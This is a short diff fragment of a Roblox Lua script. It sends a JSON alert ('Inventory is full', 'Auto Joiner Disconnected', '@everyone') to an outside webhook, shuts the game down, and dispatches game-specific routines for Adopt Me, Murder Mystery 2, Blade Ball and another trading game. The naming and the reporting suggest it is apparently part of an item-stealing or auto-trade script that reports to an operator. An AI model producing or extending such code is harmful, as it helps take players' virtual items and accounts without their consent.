+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode({
+			content = "Inventory is full\nAuto Joiner Disconnected\n@everyone"
+		})
+	})
+	wait(1)
+	game:Shutdown()
+end)
+
+function Launch()
+	universeid = game.GameId
+
+	if universeid == 383310974 then
+		adoptme()
+	end
+
+	if universeid == 66654135 then
+		mm2()
+	end
+
+	if universeid == 4777817887 then
+		bladeball()
+	end
+
+	if universeid == 7436755782 then
+		gag()
+	end
+end
+
+Launch()
